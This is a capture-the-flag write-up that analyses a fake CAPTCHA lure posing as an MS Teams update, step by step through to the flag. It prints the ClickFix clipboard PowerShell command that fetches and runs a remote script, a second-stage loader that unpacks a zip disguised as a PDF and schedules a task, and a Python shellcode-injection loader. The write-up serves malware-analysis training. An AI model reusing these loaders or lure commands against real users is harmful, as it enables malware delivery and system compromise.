Challenge: Verify You Are Human
Category: Malware
Author: John Hammond

Description:

My computer said I needed to update MS Teams, so that is what I have been trying to do...

...but I can't seem to get past this CAPTCHA!

CAUTION

This is the Malware category. Please be sure to approach this challenge material within an isolated virtual machine.

NOTE

Some components of this challenge may be finicky with the browser-based connection. You can still achieve what you need to, but there may be some more extra steps than if you were to approach this over the VPN.

(i.e., "remove the port" when you need to... you'll know what I mean ðŸ˜œ)

Solve:

1. Navigate to the challenge URL: https://f978df70.proxy.coursestack.com/

2. Complete the fake CAPTCHA to get redirected and follow the prompts
    To better prove you are not a robot, please:
    1.   Press and hold the  windows key   +  R.
    2.   In the verification window, press  Ctrl +  V.
    3.   Press  Enter on your keyboard to finish.

3. Clipboard Contents: "C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://f978df70.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"

4. Sanitize input, and remove the port as instructed

5. Naviate to: http://f978df70.proxy.coursestack.com/?tic=1

$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://f978df70.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard

6. Navigate to the new URL: http://f978df70.proxy.coursestack.com:443/?tic=2

7. The corrupted PDF is actually a zip file based on the PowerShell code

8. Download the PDF

9. Confirm it is a ZIP file

â”Œâ”€â”€(ctfã‰¿kali)-[~/CTF/huntress2025/malware/verify_you_are_human]
â””â”€$ file document.pdf 
document.pdf: Zip archive data, at least v2.0 to extract, compression method=deflate

10. Rename and extract the archive

â”€â”€(ctfã‰¿kali)-[~/CTF/huntress2025/malware/verify_you_are_human]
â””â”€$ mv document.pdf document.zip | unzip document.zip
Archive:  document.zip
  inflating: LICENSE.txt             
  inflating: _asyncio.pyd            
  inflating: _bz2.pyd                
  inflating: _ctypes.pyd             
  inflating: _decimal.pyd            
  inflating: _elementtree.pyd        
  inflating: _hashlib.pyd            
  inflating: _lzma.pyd               
  inflating: _multiprocessing.pyd    
  inflating: _overlapped.pyd         
  inflating: _queue.pyd              
  inflating: _socket.pyd             
  inflating: _sqlite3.pyd            
  inflating: _ssl.pyd                
  inflating: _uuid.pyd               
  inflating: _wmi.pyd                
  inflating: _zoneinfo.pyd           
  inflating: cpython-3134.pyc        
  inflating: libcrypto-3.dll         
  inflating: libffi-8.dll            
  inflating: libssl-3.dll            
  inflating: output.py               
  inflating: pyexpat.pyd             
  inflating: python.cat              
  inflating: python.exe              
  inflating: python3.dll             
  inflating: python313._pth          
  inflating: python313.dll           
  inflating: python313.zip           
  inflating: pythonw.exe             
  inflating: select.pyd              
  inflating: sqlite3.dll             
  inflating: unicodedata.pyd         
  inflating: vcruntime140.dll        
  inflating: winsound.pyd  
  
11. Decoding the PowerShell with PowerDecode further we get

$JGFDGMKNGD = '.pyc';$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://f978df70.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument ""$RYGSDFSGSH"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard


11a. rundll32 shell32.dll,ShellExec_RunDLL "C:\Users\ctf\AppData\Local\aa659f12-c7e0-4c94-a07a-f41c1b309304\pythonw" "C:\Users\ctf\AppData\Local\aa659f12-c7e0-4c94-a07a-f41c1b309304\cpython-3134.pyc"

12. Uploading "cpython-3134.pyc" to https://pylingual.io we get

# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: output.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 2025-09-06 20:03:01 UTC (1757188981)

import base64
exec(base64.b64decode('aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp').decode('utf-8'))

13. Using CyberChef to decode the Base64 we get

import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()

14. Printing out the Shellcode with the modified script, shellcode.py below we get

import ctypes
import base64

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
print(shellcode)
#ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
#buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
#ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
#functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
#fn = functype(ptr)
#fn()

â”Œâ”€â”€(ctfã‰¿kali)-[~/CTF/huntress2025/malware/verify_you_are_human]
â””â”€$ python shellcode.py
bytearray(b'U\x89\xe5\x81\xec\x80\x00\x00\x00h\x93\xd8\x84\x84h\x90\xc3\xc6\x97h\xc3\x90\x93\x92h\x90\xc4\xc3\xc7h\x9c\x93\x9c\x93h\xc0\x9c\xc6\xc6h\x97\xc6\x9c\x93h\x94\xc7\x9d\xc1h\xde\xc1\x96\x91h\xc3\xc9\xc4\xc2\xb9\n\x00\x00\x00\x89\xe7\x817\xa5\xa5\xa5\xa5\x83\xc7\x04Iu\xf4\xc6D$&\x00\xc6\x85\x7f\xff\xff\xff\x00\x89\xe6\x8d}\x80\xb9&\x00\x00\x00\x8a\x06\x88\x07FGIu\xf7\xc6\x07\x00\x8d<$\xb9@\x00\x00\x00\xb0\x01\x88\x07GIu\xfa\xc9\xc3')


15. Decoding the base64 with CyberChef we get 

https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Base64','string':'me6Fzk0HR9uXTzzuFVLORM2V%2BZqMbA%3D%3D'%7D,'Standard',false)To_Hex('Space',0)Disassemble_x86('64','Full%20x86%20architecture',16,0,true,true)&input=ekdkZ1Q2R0hSOXVYSjY4MmtkYW0xQTVUYnZKUC9BcDg3VjZKeElDekM5eWdmWDJTVW9JTC9XNWNFUC94ZWtKVGpHK1pHZ0hlVkMzY2xnejl4NVg1bWdXTEdOa2dhK2lpeEJ5VEJra2EweGJxWXMxVGZPVnprMmJ1RENqQWVzZGlzVTg4N3A5VVJrT0wwckR2ZTZxZTdnanlhYjRIMjVkUGpPK2RWWWtOdUc4d1dRPT0&oeol=CRLF

0000000000000000 55                              PUSH RBP
0000000000000001 89E5                            MOV EBP,ESP
0000000000000003 81EC80000000                    SUB ESP,00000080
0000000000000009 6893D88484                      PUSH 8484D893
000000000000000E 6890C3C697                      PUSH 97C6C390
0000000000000013 68C3909392                      PUSH 929390C3
0000000000000018 6890C4C3C7                      PUSH C7C3C490
000000000000001D 689C939C93                      PUSH 939C939C
0000000000000022 68C09CC6C6                      PUSH C6C69CC0
0000000000000027 6897C69C93                      PUSH 939CC697
000000000000002C 6894C79DC1                      PUSH C19DC794
0000000000000031 68DEC19691                      PUSH 9196C1DE
0000000000000036 68C3C9C4C2                      PUSH C2C4C9C3
000000000000003B B90A000000                      MOV ECX,0000000A
0000000000000040 89E7                            MOV EDI,ESP
0000000000000042 8137A5A5A5A5                    XOR DWORD PTR [RDI],A5A5A5A5
0000000000000048 83C704                          ADD EDI,00000004
000000000000004B 4975F4                          JNE 0000000000000042
000000000000004E C644242600                      MOV BYTE PTR [RSP+26],00
0000000000000053 C6857FFFFFFF00                  MOV BYTE PTR [RBP-00000081],00
000000000000005A 89E6                            MOV ESI,ESP
000000000000005C 8D7D80                          LEA EDI,[RBP-80]
000000000000005F B926000000                      MOV ECX,00000026
0000000000000064 8A06                            MOV AL,BYTE PTR [RSI]
0000000000000066 8807                            MOV BYTE PTR [RDI],AL
0000000000000068 46474975F7                      JNE 0000000000000064
000000000000006D C60700                          MOV BYTE PTR [RDI],00
0000000000000070 8D3C24                          LEA EDI,[RSP]
0000000000000073 B940000000                      MOV ECX,00000040
0000000000000078 B001                            MOV AL,01
000000000000007A 8807                            MOV BYTE PTR [RDI],AL
000000000000007C 474975FA                        JNE 000000000000007A
0000000000000080 C9                              LEAVE
0000000000000081 C3                              RET

17. Feeding the Assembly to an LLM of your choice, we get a Python script to produce printable output

# reconstruct_decrypt.py
from binascii import hexlify

# immediates in the order they are pushed (appearance order in the asm)
pushes = [
    0x8484D893,
    0x97C6C390,
    0x929390C3,
    0xC7C3C490,
    0x939C939C,
    0xC6C69CC0,
    0x939CC697,
    0xC19DC794,
    0x9196C1DE,
    0xC2C4C9C3,
]

# Memory layout at ESP after all pushes: last push is at lowest address first.
# So construct bytes by iterating pushes in reverse order and taking little-endian bytes.
data = b''.join((x.to_bytes(4, 'little') for x in reversed(pushes)))  # 40 bytes

# The routine XORs each dword with 0xA5A5A5A5
key = 0xA5A5A5A5
dec = bytearray()
for i in range(0, len(data), 4):
    dword = int.from_bytes(data[i:i+4], 'little')
    dec_dword = dword ^ key
    dec += dec_dword.to_bytes(4, 'little')

print("raw decrypted hex:", hexlify(dec).decode())
print("raw decrypted bytes:", dec)
# The routine then copies the first 0x26 (38) bytes into a buffer and null-terminates
s = dec[:0x26]
print("\nfirst 0x26 bytes (hex):", hexlify(s).decode())
try:
    print("as ascii (printable or . for nonprint):")
    print(''.join((chr(b) if 32 <= b < 127 else '.') for b in s))
except:
    print(s)
	
â”Œâ”€â”€(ctfã‰¿kali)-[~/CTF/huntress2025/malware/verify_you_are_human]
â””â”€$ python get_flag.py
raw decrypted hex: 666c61677b64333431623864326339366539636339363936356166626635363735666332367d2121
raw decrypted bytes: bytearray(b'flag{d341b8d2c96e9cc96965afbf5675fc26}!!')

first 0x26 bytes (hex): 666c61677b64333431623864326339366539636339363936356166626635363735666332367d
as ascii (printable or . for nonprint):
flag{d341b8d2c96e9cc96965afbf5675fc26}

Flag: flag{d341b8d2c96e9cc96965afbf5675fc26}
